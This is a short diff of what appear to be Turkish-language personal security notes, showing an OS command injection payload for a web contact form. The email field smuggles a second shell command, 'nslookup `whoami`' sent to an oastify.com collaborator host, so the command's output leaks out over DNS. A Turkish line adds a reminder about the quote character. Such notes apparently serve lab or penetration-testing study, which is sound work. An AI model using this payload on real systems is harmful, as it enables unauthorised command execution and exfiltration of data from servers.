@@ -20,7 +20,7 @@ saldiri bittiginde gordugumuz deger gercek degerdir.
 _______________________________________________________________
 
 ### OS Command Injection 
-```Javascript
+```url
 csrf=rNED41GCvbP8vgtXfK1rs4BGsTvbe11F&name=testerererere&email=tipybu%40cyclelove.cc||nslookup+`whoami`.oyqhkljtvxhzosoxlu4m9qtg87ey2n.oastify.com+#||&subject=testre&message=testssssss
 ```
 Burada tirnak isareti farkli bunu unutma.
